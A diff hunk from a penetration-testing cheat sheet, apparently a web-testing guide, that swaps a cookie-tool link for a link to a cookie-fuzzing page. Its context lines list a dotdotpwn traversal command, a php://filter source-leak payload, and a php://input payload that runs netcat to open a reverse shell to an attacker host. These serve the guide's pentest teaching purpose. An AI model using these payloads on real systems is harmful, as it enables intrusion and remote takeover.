@@ -96,7 +96,7 @@ root@attacker-system:~# dotdotpwn -h (TARGET IP ADDRESS) -m http -f config.php
    3. `?page=php://filter/convert.base64-encode/resource=index` - this payload will base64 encode the index.php file and return it in the DOM.
    4. `?page=php://input` with `<? system('nc -e /bin/bash (ATTACKER IP ADDRESS) (ATTACKER PORT)'); ?>` as POST data - command injection technique.
    5. `?url=http://someurl` may be vulnerable to remote file inclusion (RFi)
-4. **Session Management** - Use the [Quick Cookie Manager](https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/) Firefox plugin to analyze and set cookies.
+4. **Session Management** - Edit and fuzz cookies as described in [my cheat sheet here.](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/cookie-fuzzing.md)
 ## 6. Burp Suite CE
 Use the BurpSuite Community Edition to analyze all requests from the server. 
 1. Turn on the proxy for Intercept in the BurpSuite CE window
